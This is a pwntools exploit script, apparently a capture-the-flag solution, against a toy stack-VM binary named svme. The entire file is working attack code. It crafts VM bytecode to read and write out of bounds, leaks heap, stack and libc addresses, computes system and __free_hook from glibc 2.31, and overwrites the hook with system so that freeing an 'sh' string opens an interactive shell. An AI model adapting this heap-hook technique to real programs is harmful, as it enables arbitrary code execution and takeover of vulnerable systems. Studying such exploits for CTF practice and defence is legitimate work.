from pwn import *
context.log_level = 'debug'

DEBUG = 1
if DEBUG:
    p = process('./svme_dbg')
    #p = gdb.debug('./svme_dbg','b vm_free\nb vm_print_data\nb vm_exec')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('127.0.0.1','4321')
    libc = ELF('./libc-2.31.so')

NOOP = p32(0)
IADD = p32(1)
ISUB = p32(2)
IMUL = p32(3)
ILT = p32(4)
IEQ = p32(5)
BR = p32(6)
BRT = p32(7)
BRF = p32(8)
ICONST = p32(9)
LOAD = p32(10)
GLOAD = p32(11)
STORE = p32(12)
GSTORE = p32(13)
PRINT = p32(14)
POP = p32(15)
CALL = p32(16)
RET = p32(17)
HALT = p32(18)

# length of op: 2
push =lambda data : ICONST + p32(data)
pop = lambda : POP
br = lambda ip : BR + p32(ip)
brt = lambda ip : BRT + p32(ip)
brf = lambda ip : BRF + p32(ip)
load = lambda offset : LOAD + p32(offset)
gload = lambda addr : GLOAD + p32(addr)
store = lambda offset : STORE + p32(offset)
gstore = lambda addr : GSTORE + p32(addr)
call = lambda addr,nargs,nlocals : CALL + p32(addr) + p32(nargs) + p32(nlocals)

overflow_count = 3
libc_start_main_off = libc.sym['__libc_start_main']
libc_leak_addr_off = libc_start_main_off + 243
free_hook_off = libc.sym['__free_hook']
system_off = libc.sym['system']
#gdb.attach(p)
# save heap address
payload = PRINT + store(1) + store(0)
# save stack address to globals
payload += PRINT*2 + store(3) + store(2)
payload += load(2) + load(3) + push(0x80) + push(0)
payload += load(2) + load(3) + push(0x400) + push(0)

# load libc base address
payload += gload(134) + push(libc_leak_addr_off) + ISUB + gload(135)
# save libc base address
payload += store(5) + store(4)
# load system address
payload += load(4) + push(system_off) + IADD + load(5)
# save system address
payload += store(7) + store(6)
# load __free_hook address
payload += load(4) + push(free_hook_off) + IADD + load(5)
# save __free_hook address
payload += store(9) + store(8)

payload += PRINT*4 + load(8) + load(9)
payload += push(0x400) + push(0)
payload += load(6) + load(7)
payload += gstore(1) + gstore(0)

payload += PRINT*4 + load(0) + load(1)
payload += push(0x6873) + gstore(0)
payload += push(2)*((512 - len(payload))/8)
p.sendline(payload)
data = p.recv()
p.interactive()